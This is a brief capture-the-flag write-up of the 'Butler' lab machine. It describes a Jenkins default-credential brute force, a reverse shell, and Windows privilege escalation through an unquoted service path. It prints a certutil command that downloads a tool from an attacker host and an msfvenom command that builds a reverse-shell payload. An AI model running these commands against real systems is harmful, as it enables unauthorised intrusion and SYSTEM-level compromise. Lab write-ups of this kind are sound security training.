CTF Write-ups

Butler (TCM Security)

Initial Enumeration

Running an nmap scan revealed port 8080 running Jenkins. A brute-force attack using Burp Suite found the credentials:

  • Username: jenkins
  • Password: jenkins

Exploitation

Once logged in, I used a known Jenkins exploit to get a reverse shell, gaining access as the user butler.

Privilege Escalation

Step 1: Running WinPEAS

python -m http.server 80

Transferred WinPEAS using:

certutil.exe -urlcache -f http://192.168.x.x/winpeas.exe winpeas.exe

Step 2: Exploiting Unquoted Service Path

Identified a vulnerable WiseCare service with an unquoted service path:

Step 3: Creating a Malicious Executable

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.206.128 LPORT=7777 -f exe > Wise.exe

Step 4: Exploiting the Service

sc stop WiseBootAssistant
sc start WiseBootAssistant

On restart, my Wise.exe payload was executed, granting a SYSTEM shell.

Conclusion

By combining a **Jenkins brute-force attack**, **reverse shell exploit**, and an **unquoted service path attack**, I gained SYSTEM access to the **Butler** machine.
